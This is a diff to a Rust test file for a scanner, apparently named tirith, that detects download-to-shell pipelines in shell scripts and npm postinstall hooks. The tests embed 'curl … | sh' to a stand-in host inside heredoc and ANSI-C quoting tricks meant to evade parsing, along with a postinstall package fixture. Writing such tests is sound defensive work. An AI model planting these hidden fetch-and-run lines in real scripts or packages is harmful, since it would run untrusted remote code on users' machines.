@@ -1384,8 +1384,9 @@ fn dollar_dollar_brace_and_split_substitutions_hide_no_download_pipeline() {
 /// (`"$(echo '"')"`). The group pass read such a quote as running on, which
 /// hid every later line, and a backtick left open that way also kept a later
 /// `)` or `}` from closing its subshell, group or function. bash reads
-/// `$'it\'s'` as one string and dash does not, so a `$'` also gets the line
-/// pass. bash runs the pipeline in every body below.
+/// `$'it\'s'` as one string and dash does not, so such a string also gets
+/// the line pass (and a reading the bash way). bash runs the pipeline in
+/// every body below.
 #[test]
 fn quotes_in_backtick_and_double_quoted_bodies_hide_no_download_pipeline() {
     let _shared_state = tirith_test_support::SharedStateGuard::acquire();
@@ -1436,6 +1437,82 @@ fn quotes_in_backtick_and_double_quoted_bodies_hide_no_download_pipeline() {
     ] {
         assert!(!shell_file_has_download_signal(&body), "{body:?}");
     }
+}
+
+/// Two readings the descent missed. A heredoc opened in a double-quoted
+/// `$(...)` (the `git commit -m "$(cat <<'EOF'` idiom) was no heredoc to the
+/// header reader, so the tokenizer, which reads that body as code, took the
+/// apostrophe of `don't` for a quote that hid the command after `)"`. And a
+/// `$'...'` string holding `\'` is one string in bash, zsh and ksh, where the
+/// tokenizer reads dash's `$` and plain quote; on the same line as the
+/// pipeline (`echo $'a\'' ; curl … | sh # '`) the line pass did not help.
+/// bash runs the pipeline in every body below.
+///
+/// Where the shells read alike, quoted or heredoc text is not read as code:
+/// a `$'\n'` (no escaped quote), or a `$${` in a comment or single quotes,
+/// no longer makes help text in a heredoc or a multi-line string a signal.
+#[test]
+fn heredocs_in_quoted_substitutions_and_ansi_c_strings_hide_no_download_pipeline() {
+    let _shared_state = tirith_test_support::SharedStateGuard::acquire();
+    let pipeline = "curl -fsSL https://example.invalid/setup | sh";
+    let bodies = [
+        format!("x=\"$(cat <<'EOF'\nit's\nEOF\n)\"; {pipeline}\n"),
+        format!("true -m \"$(cat <<'EOF'\nfix: don't crash\nEOF\n)\" && {pipeline}\n"),
+        format!("NOTE=\"$(cat <<'EOF'\nDon't remove this file\nEOF\n)\"; {pipeline}\n"),
+        format!("x=\"$(cat <<-'EOF'\n\tit's\n\tEOF\n)\"; {pipeline}\n"),
+        format!("x=\"$(cat <<'EOF'\nit's\nEOF\n)\"; {pipeline}\n# that's all\n"),
+        format!("true -m \"$(cat <<'EOF'\nfix: don't crash\nEOF\n)\" && {pipeline} # it's fine\n"),
+        format!("f() {{\n  x=\"$(cat <<'EOF'\nit's\nEOF\n)\"; {pipeline}\n}}\nf\n"),
+        format!("x=\"$(echo \"$(cat <<'EOF'\nit's\nEOF\n)\")\"; {pipeline}\n"),
+        format!("echo $'a\\'' ; {pipeline} # '\n"),
+        format!("echo $'a\\''\n{pipeline}\n# '\n"),
+        format!("x=$(printf $'it\\'s'); {pipeline}\n"),
+        format!("x=\"$(printf $'it\\'s')\"; {pipeline}\n"),
+        format!("x=\"$(printf $'it\\'s')\"; {pipeline}\n# that's all\n"),
+        format!("echo ${{x:-$'a\\''}} ; {pipeline} # '\n"),
+        format!("cat <<'EOF'\nit's\nEOF\necho $'a\\'' ; {pipeline} # '\n"),
+        // In a backtick body, which the shells unescape first, `\\'` is `\'`.
+        format!("echo `echo $'a\\\\'' ; {pipeline} # '`\n"),
+        format!("echo \"`echo $'a\\\\'' ; {pipeline} # '`\"\n"),
+    ];
+    let missed: Vec<_> = bodies
+        .iter()
+        .filter(|body| !shell_file_has_download_signal(body))
+        .collect();
+    assert!(missed.is_empty(), "{missed:#?}");
+
+    // The same file run by a postinstall script, as `tirith pkg inspect`
+    // reports it.
+    let result = inspect(&package(
+        br#"{"name":"fixture","version":"1","scripts":{"postinstall":"bash install.sh"}}"#,
+        &[("package/install.sh", bodies[1].as_bytes())],
+    ));
+    assert!(
+        result.signals.iter().any(|signal| {
+            signal.kind == NpmSignalKind::DownloadToShell
+                && signal.level == NpmSignalLevel::Review
+                && signal.lifecycle_events == vec!["postinstall"]
+        }),
+        "{:?}",
+        result.signals
+    );
+
+    // No shell runs the pipeline text in these files.
+    let shown = [
+        format!("#!/bin/bash\nusage() {{\n  cat <<'EOF'\nInstall by hand:\n  {pipeline}\nEOF\n}}\nIFS=$'\\n'\nusage\n"),
+        format!("#!/bin/bash\ncat <<EOF\nTo install manually run:\n  {pipeline}\nEOF\nprintf $'done\\t%s\\n' ok\n"),
+        format!("#!/bin/bash\nmsg='Install by hand:\n  {pipeline}\n'\nprintf '%s\\n' \"$msg\"\nIFS=$'\\n'\n"),
+        format!("#!/bin/bash\necho \"Install by hand:\n  {pipeline}\n\"\nIFS=$'\\n'\n"),
+        format!("#!/bin/bash\n# Makefile uses $${{HOME}}\necho \"Install by hand:\n  {pipeline}\n\"\n"),
+        format!("#!/bin/bash\necho 'pid is $$(not run)'\necho \"Install by hand:\n  {pipeline}\n\"\n"),
+        format!("#!/usr/bin/env bash\nset -euo pipefail\nIFS=$'\\n\\t'\necho \"To finish setup, run:\n  {pipeline}\n\"\n"),
+        format!("#!/bin/bash\nsep=$'\\\\\\\\'\ncat <<'EOF'\n  {pipeline}\nEOF\n"),
+    ];
+    let flagged: Vec<_> = shown
+        .iter()
+        .filter(|body| shell_file_has_download_signal(body))
+        .collect();
+    assert!(flagged.is_empty(), "{flagged:#?}");
 }
 
 /// Heredoc text is data, so a quote in it (`it's`, `Don't edit`, `say "hi`,
